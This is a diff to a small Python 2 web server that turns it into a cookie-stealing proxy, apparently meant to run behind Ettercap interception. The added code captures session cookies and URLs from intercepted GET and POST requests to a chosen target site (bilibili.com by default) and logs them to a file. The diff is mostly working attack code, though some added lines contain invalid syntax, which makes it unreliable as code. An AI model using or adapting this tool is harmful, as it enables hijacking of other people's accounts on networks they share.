@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 #https://gist.github.com/bradmontgomery/2219997
+#Use with  Ettercap 
 """
 Very simple HTTP server in python.
 Usage::
@@ -25,9 +26,14 @@ class S(BaseHTTPRequestHandler):
         url="http://"+dict(self.headers)["host"]+self.path
         print url
         try:
-            print "cookie:\n"+dict(self.headers)["cookie"]
+            cookie="cookie:\n"+dict(self.headers)["cookie"]+"\n"
         except:
-            print "NO cookie!"
+            cookie="NO cookie!\n"
+        print cookie
+
+        if "bilibili.com" in dict(self.headers)["host"]:#Change "bilibili.com" to the website you want to recode
+            with open("result.txt","a") in file:
+                file.write("http://"+dict(self.headers)["host"]+self.path+cookie)
 
         req = urllib2.Request(url,None,dict(self.headers))
         # req.add_header(dict(self.headers))
@@ -40,9 +46,24 @@ class S(BaseHTTPRequestHandler):
         self._set_headers()
         
     def do_POST(self):
-        # Doesn't do anything with posted data
+        url="http://"+dict(self.headers)["host"]+self.path
+        print url
+        try:
+            cookie="cookie:\n"+dict(self.headers)["cookie"]+"\n"
+        except:
+            cookie="NO cookie!\n"
+        print cookie
+
+        if "bilibili.com" in dict(self.headers)["host"]:#Change "bilibili.com" to the website you want to recode
+            with open("result.txt","a") in file:
+                file.write("http://"+dict(self.headers)["host"]+self.path+cookie)
+
+        req = urllib2.Request(url,None,dict(self.headers))
+        # req.add_header(dict(self.headers))
+        # resp = urllib2.urlopen(req)
+        # content = resp.read()
         self._set_headers()
-        self.wfile.write("<html><body><h1>POST!</h1></body></html>")
+        self.wfile.write("<img src='https://cdn.pixabay.com/photo/2017/01/01/14/37/hacker-1944673_960_720.png'/>")
         
 def run(server_class=HTTPServer, handler_class=S, port=80):
     server_address = ('', port)
